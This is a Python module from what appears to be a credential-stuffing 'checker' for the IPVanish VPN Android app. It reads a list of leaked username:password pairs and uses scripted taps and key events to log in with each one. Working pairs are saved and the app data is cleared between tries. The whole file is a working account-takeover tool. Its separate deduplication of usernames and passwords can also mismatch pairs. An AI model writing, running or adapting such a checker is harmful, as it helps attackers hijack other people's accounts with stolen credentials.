#!/usr/bin/python3
#ipvanish

import modules.header as header
import modules.settings as settings
import modules.keyevents as keyevents
import time
import os

from modules.settings import directories as path

def Checker():
	os.system("clear"); header.Checking()
	ctr=0

	users=[]
	passwords=[]

	app='com.ixolit.ipvanish'

	with open (path()+'/ipvanish','r') as accounts:

		for lines in accounts:
	
			users.append(lines.split(":")[0])
			passwords.append(lines.split(":")[1].split("|")[0])
		accounts.close()
	
	users=list(dict.fromkeys(users))
	passwords=list(dict.fromkeys(passwords))

	while ctr < len(users):

		keyevents.Power(); keyevents.Menu(); keyevents.StartApp(app)
		time.sleep(2)
	
		keyevents.Tap(555,1628)
		time.sleep(1)
	
		keyevents.Write(users[ctr])
	
		keyevents.Tap(228,972); keyevents.Write(passwords[ctr])
		time.sleep(1)
	
		keyevents.Tap(589,1182)
		time.sleep(4)
	
		print("\x1bc");header.title()
		header.Checking()
		header.UserInfo(len(users)-ctr,users[ctr],passwords[ctr])
	
		while True:
		
			if "TutorialActivity" in keyevents.GetActivity('mFocusedApp'):
			
				keyevents.Tap(566,1230);time.sleep(2)
		
			if "MainActivity" in keyevents.GetActivity():
		
				header.Valid()
				header.UserInfo(len(users)-ctr,users[ctr],passwords[ctr])
			
				with open (path()+'/ipvanish','a') as final:
			
					final.write(str(users[ctr])+":"+str(passwords[ctr]+"\n"))
					final.close()
					keyevents.StopApp(app)
					keyevents.ClearData(app)
					break
		
			else:
			
				header.Invalid()
				header.UserInfo(len(users)-ctr,users[ctr],passwords[ctr])
				break
	
		keyevents.StopApp(app)
		keyevents.Power()
		ctr +=1
			
	return		
			
			
